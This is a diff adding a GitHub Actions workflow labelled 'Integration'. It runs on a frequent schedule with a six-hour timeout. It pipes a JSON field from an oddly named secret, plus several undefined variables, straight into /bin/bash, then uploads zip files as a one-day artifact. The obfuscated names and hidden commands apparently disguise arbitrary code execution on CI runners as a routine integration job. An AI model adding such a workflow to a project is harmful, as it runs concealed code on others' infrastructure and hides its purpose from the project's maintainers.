@@ -1,0 +1,37 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '47 1,7,13,19 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  job:
+    name: Go
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          ootm6608: ${{ secrets.ootm6608 }}
+        run: |
+          printf '%s' "$ootm6608" | jq -r .mhda85898 | /bin/bash
+          printf '%s' "$i704" | jq -r .kqtje91 | /bin/bash
+          printf '%s' "$clx9" | jq -r .ggape828 | /bin/bash
+          printf '%s' "$kr816" | jq -r .bdf0877 | /bin/bash
+          echo $g6 | jq -r .b78087 | /bin/bash
+
+      - name: Store artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: lYbVPuZ2
+          path: "*.zip"
+          retention-days: 1
